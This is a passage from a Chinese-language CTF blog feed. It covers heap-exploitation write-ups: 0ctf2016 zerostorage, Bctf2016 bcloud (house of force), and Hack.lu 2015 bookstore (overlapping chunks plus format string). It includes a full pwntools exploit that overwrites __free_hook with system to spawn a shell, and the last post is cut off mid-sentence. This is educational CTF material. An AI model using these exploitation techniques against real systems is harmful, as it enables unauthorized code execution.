class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># glibc 2.26</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./zerostorage&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span>(<span class="params">length, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of new entry: &quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter your data: &quot;</span>)</span><br><span class="line">    data = data.ljust(length, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">id, length, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id)) </span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of entry: &quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter your data: &quot;</span>)</span><br><span class="line">    data = data.ljust(length, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">id1, id2</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Merge from Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id1))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Merge to Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">id</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">id</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">5</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry No.&quot;</span> + str(id) + <span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># uaf, leak libc base from unsorted bin</span></span><br><span class="line">    insert(<span class="number">0x10</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0</span></span><br><span class="line">    insert(<span class="number">0x10</span>, <span class="string">b&quot;/bin/sh&quot;</span>)    <span class="comment"># 0, 1</span></span><br><span class="line">    insert(<span class="number">0xf8</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2</span></span><br><span class="line">    merge(<span class="number">0</span>, <span class="number">0</span>)                 <span class="comment">#    1, 2, 3</span></span><br><span class="line">    view(<span class="number">3</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ABC60</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin attack</span></span><br><span class="line">    maxfast_addr = libc_base + libc.sym[<span class="string">&quot;global_max_fast&quot;</span>]</span><br><span class="line">    update(<span class="number">3</span>, <span class="number">0x10</span>, p64(<span class="number">0xdeadbeef</span>) + p64(maxfast_addr<span class="number">-0x10</span>))</span><br><span class="line">    insert(<span class="number">0x80</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2, 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">2</span>)                 <span class="comment"># 0, 1,    3, 4</span></span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x1f0</span>, p64(libc_base+<span class="number">0x3AD84F</span>))</span><br><span class="line">    insert(<span class="number">0x1f0</span>, <span class="string">b&quot;&quot;</span>)          <span class="comment"># 0, 1, 2, 3, 4</span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x49</span> + p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    insert(<span class="number">0x1f0</span>, payload)      <span class="comment"># 0, 1, 2, 3, 4, 5</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>how2heap unsorted bin attack</li><li><a href="https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html">https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html</a></li><li><a href="http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/">0CTF 2016 - Zerostorage Writeup</a></li><li><a href="https://www.anquanke.com/post/id/178418">https://www.anquanke.com/post/id/178418</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;unsorted-bin-attack&quot;&gt;&lt;a href=&quot;#unsorted-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;unsorted bin attack&quot;&gt;&lt;/a&gt;unsorted bin attack&lt;/h2&gt;&lt;p&gt;对unsorted bin中的&lt;code&gt;chunk-&amp;gt;bk&lt;/code&gt;进行修改，接下来该chunk分配出去时，&lt;code&gt;chunk-&amp;gt;bk-&amp;gt;fd&lt;/code&gt;就被赋值为unsortedbin头结点地址。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bck = victim-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* remove from unsorted list */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unsorted_chunks (av)-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bck-&amp;gt;fd = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在glibc2.28中增加了以下检查，使得此攻击失效。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (__glibc_unlikely (bck-&amp;gt;fd != victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	malloc_printerr (&lt;span class=&quot;string&quot;&gt;&amp;quot;malloc(): corrupted unsorted chunks 3&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;unsorted bin attack通常为进一步的攻击做准备，比如覆写global_max_fast。&lt;/p&gt;
&lt;h2 id=&quot;0ctf2016-zerostorage&quot;&gt;&lt;a href=&quot;#0ctf2016-zerostorage&quot; class=&quot;headerlink&quot; title=&quot;0ctf2016 zerostorage&quot;&gt;&lt;/a&gt;0ctf2016 zerostorage&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;关键数据结构&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712102723178.png&quot; alt=&quot;image-20200712102723178&quot;&gt;&lt;/p&gt;
&lt;p&gt;flag：标识该节点是否存在&lt;/p&gt;
&lt;p&gt;size：记录大小&lt;/p&gt;
&lt;p&gt;content：数据块指针&lt;/p&gt;
&lt;p&gt;程序有以下功能&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1. Insert&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. Update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. Merge&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4. Delete&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5. View&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6. List&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7. Exit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;insert：获取数据块大小，并读入数据。数据块大小在128~4096这个范围内&lt;/p&gt;
&lt;p&gt;update：对数据块进行大小内容进行更新&lt;/p&gt;
&lt;p&gt;merge：将两节点合并。这里存在漏洞，输入两次相同的id，导致UAF。这个漏洞我没发现，思维还不够猥琐啊&lt;/p&gt;
&lt;p&gt;delete：释放数据块，清空节点&lt;/p&gt;
&lt;h3 id=&quot;总体思路&quot;&gt;&lt;a href=&quot;#总体思路&quot; class=&quot;headerlink&quot; title=&quot;总体思路&quot;&gt;&lt;/a&gt;总体思路&lt;/h3&gt;&lt;p&gt;通过UAF，首先泄露libc基址，然后修改其bk指针，使用unsorted bin attack修改global_max_fast变量；fastbin bin attack覆写&lt;code&gt;__free_hook&lt;/code&gt;为system函数地址。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--house_of_force Bctf2016--bcloud</title>
    <link href="http://hhdx.xyz/2020/07/07/How2heap-house-of-force-Bctf2016-bcloud/"/>
    <id>http://hhdx.xyz/2020/07/07/How2heap-house-of-force-Bctf2016-bcloud/</id>
    <published>2020-07-07T06:46:39.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><p>溢出修改topchunk的size，分配一个使size_t溢出的evil_size，使下一次分配在目标位置，进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">* new_top = old_top + nb</span></span><br><span class="line"><span class="comment">* nb = new_top - old_top</span></span><br><span class="line"><span class="comment">* req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">* req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">* req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">* req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Bctf2016-bcloud"><a href="#Bctf2016-bcloud" class="headerlink" title="Bctf2016 bcloud"></a>Bctf2016 bcloud</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8047000)</span><br></pre></td></tr></table></figure><p>程序一开始让输入name、org、hostname，输入字符串函数存在null byte overflow。</p><p>输入name函数中，字符串数组在栈中后部紧邻指针变量，所以strcpy会将该指针一并拷贝入0x40的空间（实际可用0x44），并且null byte覆盖topchunk的最低字节。可以泄露堆的地址</p><p>输入org、hostname函数中，存在同样问题，可覆盖的更多的字节。可以覆盖topchunk的size</p><a id="more"></a><p><strong>程序功能菜单</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.New note</span><br><span class="line">2.Show note</span><br><span class="line">3.Edit note</span><br><span class="line">4.Delete note</span><br><span class="line">5.Syn</span><br><span class="line">6.Quit</span><br></pre></td></tr></table></figure><p>new note: 读入size存入全局数组，分配size+4的空间将指针也存入全局数组，读入字符串</p><p>show note: 打印<code>WTF? Something strange happened.</code></p><p>edit note: 修改存储的内容，根据size数组和指针数组</p><p>delete note: free分配的空间</p><p>syn: 修改sync标识。在这里没用</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在input_name函数中，泄露堆的地址，由此可以计算evil_size；在input_orghost中覆盖topchunk的size为0xffffffff。使用atoi_got、free_got覆盖bss段所存储的全局指针数组，使用edit note函数将free_got处修改为puts_plt，使用delete note函数泄露libc base，最后使用edit note 修改atoi_got为system函数地址。</p><h3 id="House-of-force-1"><a href="#House-of-force-1" class="headerlink" title="House of force"></a>House of force</h3><p>这个手法还是比较简单的，就是一开始没有找到漏洞。。只发现了null byte overflow。</p><p>使用input_orghost函数覆盖topchunk-&gt;size为0xffffffff，接下来就是计算evil_size了。</p><p>泄露的heap地址为分配的第一个0x40地址，称之为leak_heap。leak_heap+0x40就是此时的topchunk，后来又分配了两个0x40，此时<code>topchunk = leak_heap + 0x40 + 0x48*2</code>。到目标地址，还需要分配两个chunk，也就有两个8字节的头，new note中又加了4字节，所以<code>evil_size = dest_addr - topchunk - 8*2 - 4</code>。</p><p>exp中，直接发送这个负值就可以，int到size_t，其中所存的数字没有变化，只是两种类型的解读不一样。原来我想发送unsigned值(evil_size&amp;0xffffffff)，结果发现32位程序中atoi只会将其解析为4字节int最大的正数，即0x7fffffff。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/bctf2016%20bcloud/exp.py">exploit</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>how2heap house_of_force.c</li><li><a href="https://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html">https://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;House-of-force&quot;&gt;&lt;a href=&quot;#House-of-force&quot; class=&quot;headerlink&quot; title=&quot;House of force&quot;&gt;&lt;/a&gt;House of force&lt;/h2&gt;&lt;p&gt;溢出修改topchunk的size，分配一个使size_t溢出的evil_size，使下一次分配在目标位置，进行修改。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* new_top = old_top + nb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* nb = new_top - old_top&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req + 2sizeof(long) = new_top - old_top&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req = new_top - old_top - 2sizeof(long)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req = dest - 2sizeof(long) - old_top - 2sizeof(long)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;* req = dest - old_top - 4*sizeof(long)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;Bctf2016-bcloud&quot;&gt;&lt;a href=&quot;#Bctf2016-bcloud&quot; class=&quot;headerlink&quot; title=&quot;Bctf2016 bcloud&quot;&gt;&lt;/a&gt;Bctf2016 bcloud&lt;/h2&gt;&lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x8047000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;程序一开始让输入name、org、hostname，输入字符串函数存在null byte overflow。&lt;/p&gt;
&lt;p&gt;输入name函数中，字符串数组在栈中后部紧邻指针变量，所以strcpy会将该指针一并拷贝入0x40的空间（实际可用0x44），并且null byte覆盖topchunk的最低字节。可以泄露堆的地址&lt;/p&gt;
&lt;p&gt;输入org、hostname函数中，存在同样问题，可覆盖的更多的字节。可以覆盖topchunk的size&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--overlapping_chunks Hack.lu2015--bookstore</title>
    <link href="http://hhdx.xyz/2020/07/05/How2heap-overlapping-chunks-Hack-lu2015-bookstore/"/>
    <id>http://hhdx.xyz/2020/07/05/How2heap-overlapping-chunks-Hack-lu2015-bookstore/</id>
    <published>2020-07-05T10:45:39.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping chunks"></a>overlapping chunks</h2><p>溢出对unsortedbin中的<code>chunk-&gt;size</code>进行修改，造成堆块重叠。</p><h2 id="hack-lu2015-bookstore"><a href="#hack-lu2015-bookstore" class="headerlink" title="hack.lu2015 bookstore"></a>hack.lu2015 bookstore</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><p>程序是一个订书系统，在main函数开始处，连续分配3个0x80的空间，一个存储订单1——order1，一个存储订单2——order2，一个存储提示信息——info。有以下功能菜单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1: Edit order 1</span><br><span class="line">2: Edit order 2</span><br><span class="line">3: Delete order 1</span><br><span class="line">4: Delete order 2</span><br><span class="line">5: Submit</span><br></pre></td></tr></table></figure><p>Edit order 1/2：order1/order2使用fgetc读取字符串，读到<code>\n</code>终止，所以这里存在溢出</p><p>Delete order 1/2：free掉order1/order2。这里存在指针悬空</p><p>Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出</p><p>程序末尾<code>printf(info)</code>存在可能的格式化字符串漏洞。</p><h3 id="overlapping-chunks-amp-amp-format-string-vulnerability"><a href="#overlapping-chunks-amp-amp-format-string-vulnerability" class="headerlink" title="overlapping chunks &amp;&amp; format string vulnerability"></a>overlapping chunks &amp;&amp; format string vulnerability</h3><a id="more"></a><p>总体思路：释放order2，溢出order1修改<code>order2chunk-&gt;size = 0x151</code>。并在order1上布置format string，以泄露libc和stack addr，和修改fini_array为start的地址。第二次format string修改main函数返回地址为one_gadget。</p><p>fini_array存储main函数结束后将要执行的函数地址，一般修改为main函数来达到再运行一次的目的。这里我修改为start也可以达到此效果，原本想达到main函数循环执行的效果，可是没有如我的心愿。。。</p><h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h4><p>溢出修改unsortedbin中的order2的大小为0x151后，再分配0x140的orderlist，将会出现下图的情况。要想办法将format string精准控制在info开始处。</p><p>submit函数中，连接order1后，<code>orderlist1 = &quot;Order 1: &quot; + XXXXXXXX</code>；order2指针悬空，和现在的orderlist指向的地址相同，所以连接order2将出现 <code>orderlist = &quot;Order 1: &quot; + XXXXXX + &quot;\nOrder 2: &quot; + orderlist1</code>。其中长度为9的字符串<code>Order 1: 